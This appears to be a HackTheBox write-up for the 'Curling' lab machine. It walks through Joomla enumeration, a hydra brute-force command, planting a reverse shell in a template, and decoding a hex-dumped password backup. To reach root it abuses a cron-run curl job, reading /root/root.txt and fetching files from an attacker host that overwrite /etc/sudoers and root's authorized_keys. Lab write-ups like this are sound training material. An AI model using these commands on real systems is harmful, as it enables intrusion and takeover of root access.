# Recon
```
sudo nmap -sV -p- -sC -oN nmap.txt -O 10.10.10.150 -T5
```
<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Curling/assets/1.png">

The scan shows two open ports and the target is running on Linux. On port 80 there's a webservice running a CMS. We spot a administator username in a message: ```Floris```. Next we'll try to find out the type and version of the CMS.

# Enumeration
Running ```whatweb``` on the target shows us that the webservice is running Joomla.
<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Curling/assets/2.png">

```Wappalyzer``` tells us the same thing:

<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Curling/assets/4.png">

Next we'll run ```joomscan``` on the target only to find out it didn't return anything useful. We do however find the administrator login page at ```http://10.10.10.150/administrator/```

<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Curling/assets/3.png">

# Initial Foothold
We can use ```cewl``` to create a wordlist in order to bruteforce the ```Floris``` administrator account.
```
cewl -m 3 http://10.10.10.150 -d 3 -w words.txt 
```
```Cewl``` removes trailing numbers so we'll add ```curling2018``` to our wordlist. We also use ```john the ripper``` to add numbers and symbols:
```
john --wordlist=words.txt --rules --stdout > words-modified.txt 
```

We intercept a login attempt with ```BurpSuite``` and use the information to craft the request for ```thc-hydra```:
<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Curling/assets/5.png">
```
hydra -l Floris -P words-modified.txt 10.10.10.150 http-post-form "/:username=^USER^&passwd=^PASS^&option=com_login&task=login&return=aW5kZXgucGhw&9abbf60416dedcbdf4f5530a3ddea49d=1:F=Username and password do not match" -V 
```
This didn't work either..

Reviewing the code from the website reveals a secret.txt file. This file contains a base64 encoded string which decodes to: ```Curling2018!```.

<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Curling/assets/6.png">

We can now login at the administrator page using ```Floris``` and ```Curling2018!```.

Next thing we can try is to upload a reverse php shell from Pentestmonkey. A filter is blocking this attempt. We can try to bypass these filters by altering the request but it didn't seem to work. Another method is to change the content of a page. We'll do this for the ```index.php``` page after browsing to ```Extensions >  Templates > Templates > Beez3 Details and Files```.

<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Curling/assets/8.png">

As soon as we preview the template we have a reverse shell:

<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Curling/assets/7.png">

# Lateral movement
Trying to upgrade to a PTY shell didn't work as there's no ```python``` installed. We can however try to upgrade to a TTY shell:
```
/usr/bin/script -qc /bin/bash /dev/null	
export TERM=xterm
Press ctrl+z key combination 
stty raw -echo; fg
```

We look for cron jobs, running processes and check the kernel version with ```uname -a```. This shows the target is running Linux Curling 4.15.0. Nothing special to see here.

When browsing the users files we have access to a file named ```pass_word``` backup. After investigating this file it turns out to be hex dump using ```xxd```. Which we can reverse.

<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Curling/assets/9.png">

```
cat password_backup | xxd -r > output
```

We then have to extract the file a few times using the following commands:
```
bzip2 -d bak
file bak.out
mv bak.out bak.gz
gzip -d bak.gz
file bak
bzip2 -d bak
file bak.out
tar xf bak.out
cat password.txt
```

<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Curling/assets/10.png">

This provides us a password: ```5d<wdCbdZu)|hChXll```. We can now use ```su floris``` and enter the password to have access using the ```floris``` account.

# Privilege Escalation (Method 1)
We now have access to the ```admin-area``` where we find two files named ```input``` and ```report```. There's probably a cron job running as root. We can confirm this by running the following command:
```
while true; do ps waux | grep report | grep -v "grep --color"; done
```
We could also use ```pspy64s``` for this.

<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Curling/assets/11.png">

One way to get the root flag is to change the ```input``` file so that it uses ```curl``` to retrieve the root flag:

```
echo url = "file:///root/root.txt" > input
```
And then wait until the cron jobs runs.

# Privilege Escalation (Method 2)
Another way is to change the ```sudo``` configuration:
```
nano my-sudoers

Add:
root	ALL=(ALL:ALL) ALL
floris	ALL=(ALL:ALL) ALL
```
And start a webserver on the attacking machine:
```
python -m SimpleHTTPServer 8000
```
We then change the content of the ```input``` file so that it downloads our sudoers file and saves it at ```/etc/sudoers```:
```
echo -e 'url = "http://10.10.14.3:8000/my-sudoers"\noutput = "/etc/sudoers"' > input
```
We can now run ```sudo su``` and enter our known password to get a shell as root:

<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Curling/assets/12.png">

# Privilege Escalation (Method 3)
Yet another way is to copy our public ```ssh``` key to the authorized keys at our target. We'll first create a keypair using ```ssh-keygen``` and setup a webserver.

<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Curling/assets/13.png">

We then change the content of the ```input``` file  
```
echo -e 'url = "http://10.10.14.3:8000/authorized_keys"\noutput = "/root/.ssh/authorized_keys"' > input
```
We again wait until the file is downloaded and are then able to login as ```root```:
<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Curling/assets/14.png">
















